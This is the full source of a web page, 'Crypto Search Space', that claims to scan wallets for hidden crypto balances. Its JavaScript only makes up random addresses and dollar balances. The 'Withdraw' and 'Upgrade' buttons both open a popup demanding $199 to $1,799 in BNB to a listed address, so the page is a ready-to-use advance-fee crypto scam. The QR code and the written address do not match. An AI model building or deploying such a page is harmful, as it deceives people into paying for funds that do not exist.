<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Crypto Search Space ™</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet" />
<style>
  :root {
    --bg-dark: #0f0f1e;
    --text-light: #eee;
    --accent: #f9a825;
    --font-family: 'Inter', sans-serif;
  }
  * {
    box-sizing: border-box;
  }
  body {
    margin: 0; padding: 0;
    font-family: var(--font-family);
    background: var(--bg-dark);
    color: var(--text-light);
    overflow-x: hidden;
  }
  header {
    background: #111;
    padding: 1rem 2rem;
    font-weight: 700;
    font-size: 1.5rem;
    text-align: center;
    border-bottom: 2px solid var(--accent);
  }
  main {
    max-width: 960px;
    margin: 1.5rem auto;
    padding: 0 1rem;
  }
  button {
    cursor: pointer;
    background: var(--accent);
    border: none;
    padding: 0.6rem 1.2rem;
    border-radius: 4px;
    font-weight: 600;
    color: var(--bg-dark);
    margin-right: 1rem;
    transition: background 0.3s ease;
  }
  button:hover {
    background: #ffca28;
  }
  #scannerControls {
    margin-bottom: 1rem;
  }
  #notice {
    background: #222;
    padding: 0.7rem 1rem;
    border-radius: 4px;
    font-size: 0.9rem;
    margin-bottom: 1rem;
    overflow: hidden;
  }
  #notice marquee {
    color: #f9a825;
  }
  #foundList {
    background: #1a1a2e;
    border-radius: 6px;
    padding: 1rem;
    max-height: 400px;
    overflow-y: auto;
  }
  .wallet-item {
    border-bottom: 1px solid #333;
    padding: 0.4rem 0;
    display: flex;
    justify-content: space-between;
    align-items: center;
    font-size: 0.9rem;
  }
  .wallet-address {
    font-family: monospace;
    font-size: 0.75rem; /* ছোট ফন্ট */
    color: #ddd;
    word-break: break-all;
    flex: 1;
  }
  .wallet-balance {
    font-weight: 700;
    color: #f9a825;
    margin-left: 1rem;
    white-space: nowrap;
  }
  /* Popup Styles */
  #planPopup {
    position: fixed;
    top: 0; left: 0; right: 0; bottom: 0;
    background: rgba(0,0,0,0.8);
    display: none;
    justify-content: center;
    align-items: center;
    z-index: 999;
  }
  #planPopup .popup-content {
    background: var(--bg-dark);
    padding: 2rem;
    border-radius: 8px;
    max-width: 360px;
    text-align: center;
    box-shadow: 0 0 20px var(--accent);
  }
  #planPopup h2 {
    margin-top: 0;
    margin-bottom: 1rem;
    color: var(--accent);
  }
  #planPopup .plans {
    text-align: left;
    margin-bottom: 1rem;
  }
  #planPopup .plan-option {
    margin: 0.6rem 0;
    cursor: pointer;
    padding: 0.6rem;
    border-radius: 4px;
    border: 1px solid transparent;
    transition: all 0.3s ease;
  }
  #planPopup .plan-option:hover, #planPopup .plan-option.selected {
    border-color: var(--accent);
    background: #222;
  }
  #planPopup .qr-code {
    margin: 1rem 0;
  }
  #planPopup button.close-btn {
    background: #444;
    color: #eee;
    padding: 0.5rem 1rem;
    border-radius: 4px;
  }
  /* Responsive */
  @media(max-width: 480px) {
    main {
      margin: 1rem;
    }
    button {
      margin-bottom: 0.8rem;
      width: 100%;
    }
    #scannerControls {
      display: flex;
      flex-direction: column;
    }
  }
</style>
</head>
<body>

<header>Crypto Search Space ™</header>

<main>
  <div id="notice">
    <marquee behavior="scroll" direction="left" scrollamount="6">
      Welcome to Crypto Search Space ™ — Scan wallets and find hidden crypto balances! Upgrade for premium features.
    </marquee>
  </div>

  <div id="scannerControls">
    <button id="startScanBtn">Start Scan</button>
    <button id="stopScanBtn" disabled>Stop Scan</button>
    <button id="upgradeBtn">Upgrade Now</button>
    <button id="withdrawBtn">Withdraw</button>
  </div>

  <section id="foundList" aria-live="polite" aria-label="Found Wallets">
    <!-- Wallet items will appear here -->
  </section>
</main>

<!-- Plan Upgrade Popup -->
<div id="planPopup" role="dialog" aria-modal="true" aria-labelledby="popupTitle" aria-describedby="popupDesc">
  <div class="popup-content">
    <h2 id="popupTitle">Upgrade Plans</h2>
    <p id="popupDesc">Choose a plan and send payment via BNB Smart Chain.</p>

    <div class="plans" id="plansList">
      <!-- Plans injected by JS -->
    </div>

    <div class="qr-code" id="qrCodeContainer">
      <!-- QR code image here -->
      <img src="https://chart.googleapis.com/chart?cht=qr&chs=180x180&chl=bnb1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh" alt="BNB Smart Chain Payment QR Code" />
      <p id="paymentAmount" style="color: var(--accent); font-weight: 700; margin-top: 0.5rem;">Send: $199 (One blockchain, 1 Month)</p>
      <p style="font-size: 0.8rem; color: #ccc; margin-top: 0;">Address: 0x56169808ee926359c3403c2049d77c574b40db32</p>
    </div>

    <button class="close-btn" id="closePopupBtn">Close</button>
  </div>
</div>

<script>
  // Plans Data
  const plans = [
    { id: 1, name: "One blockchain", price: 199 },
    { id: 2, name: "Two blockchains", price: 399 },
    { id: 3, name: "Three blockchains", price: 599 },
    { id: 4, name: "Four blockchains", price: 799 },
    { id: 5, name: "Five blockchains", price: 999 },
    { id: 6, name: "Six blockchains", price: 1199 },
    { id: 7, name: "Seven blockchains", price: 1399 },
    { id: 8, name: "Eight blockchains", price: 1599 },
    { id: 9, name: "Nine blockchains", price: 1799 },
  ];

  const startScanBtn = document.getElementById('startScanBtn');
  const stopScanBtn = document.getElementById('stopScanBtn');
  const upgradeBtn = document.getElementById('upgradeBtn');
  const withdrawBtn = document.getElementById('withdrawBtn');
  const foundList = document.getElementById('foundList');
  const planPopup = document.getElementById('planPopup');
  const closePopupBtn = document.getElementById('closePopupBtn');
  const plansList = document.getElementById('plansList');
  const paymentAmount = document.getElementById('paymentAmount');

  let scanning = false;
  let scanInterval;
  let foundWallets = [];

  // Load saved wallets from localStorage
  function loadWallets() {
    const saved = localStorage.getItem('foundWallets');
    if (saved) {
      foundWallets = JSON.parse(saved);
      renderWallets();
    }
  }

  // Save wallets to localStorage
  function saveWallets() {
    localStorage.setItem('foundWallets', JSON.stringify(foundWallets));
  }

  // Render wallet list
  function renderWallets() {
    foundList.innerHTML = '';
    if (foundWallets.length === 0) {
      foundList.innerHTML = '<p style="text-align:center; color:#888;">No wallets found yet.</p>';
      return;
    }
    foundWallets.forEach(wallet => {
      const div = document.createElement('div');
      div.classList.add('wallet-item');

      const addressSpan = document.createElement('span');
      addressSpan.classList.add('wallet-address');
      addressSpan.textContent = wallet.address;

      const balanceSpan = document.createElement('span');
      balanceSpan.classList.add('wallet-balance');
      balanceSpan.textContent = `$${wallet.balance.toFixed(2)}`;

      div.appendChild(addressSpan);
      div.appendChild(balanceSpan);
      foundList.appendChild(div);
    });
  }

  // Simulate scanning wallet addresses
  function simulateScan() {
    if (!scanning) return;

    // Simulate found wallet address and balance
    const walletAddress = '0x' + Math.random().toString(16).substr(2, 40);
    const balance = +(Math.random() * 1000).toFixed(2);

    // Check if wallet already found
    if (foundWallets.find(w => w.address === walletAddress)) {
      return; // skip duplicates
    }

    // Add wallet to found list
    foundWallets.push({ address: walletAddress, balance: balance });
    saveWallets();
    renderWallets();
  }

  // Start scanning
  startScanBtn.addEventListener('click', () => {
    scanning = true;
    startScanBtn.disabled = true;
    stopScanBtn.disabled = false;
    simulateScan(); // immediate first scan
    scanInterval = setInterval(simulateScan, 2500);
  });

  // Stop scanning
  stopScanBtn.addEventListener('click', () => {
    scanning = false;
    startScanBtn.disabled = false;
    stopScanBtn.disabled = true;
    clearInterval(scanInterval);
  });

  // Show upgrade popup
  function showPlanPopup() {
    planPopup.style.display = 'flex';
    selectPlan(plans[0].id);
  }
  upgradeBtn.addEventListener('click', showPlanPopup);
  withdrawBtn.addEventListener('click', () => {
    // Withdraw button opens upgrade popup as well
    showPlanPopup();
  });

  closePopupBtn.addEventListener('click', () => {
    planPopup.style.display = 'none';
  });

  // Render plan options
  function renderPlans() {
    plansList.innerHTML = '';
    plans.forEach(plan => {
      const div = document.createElement('div');
      div.classList.add('plan-option');
      div.textContent = `${plan.name} – $${plan.price} (1 Month)`;
      div.dataset.planId = plan.id;
      div.addEventListener('click', () => selectPlan(plan.id));
      plansList.appendChild(div);
    });
  }

  let selectedPlanId = null;

  function selectPlan(planId) {
    selectedPlanId = planId;
    // Remove selected class from all
    [...plansList.children].forEach(child => {
      child.classList.remove('selected');
    });
    // Add selected class
    const selectedDiv = [...plansList.children].find(c => c.dataset.planId == planId);
    if (selectedDiv) selectedDiv.classList.add('selected');

    // Update payment amount text
    const plan = plans.find(p => p.id == planId);
    if (plan) {
      paymentAmount.textContent = `Send: $${plan.price} (${plan.name}, 1 Month)`;
    }
  }

  // Initialize on page load
  window.addEventListener('load', () => {
    loadWallets();
    renderPlans();
  });
</script>

</body>
</html>
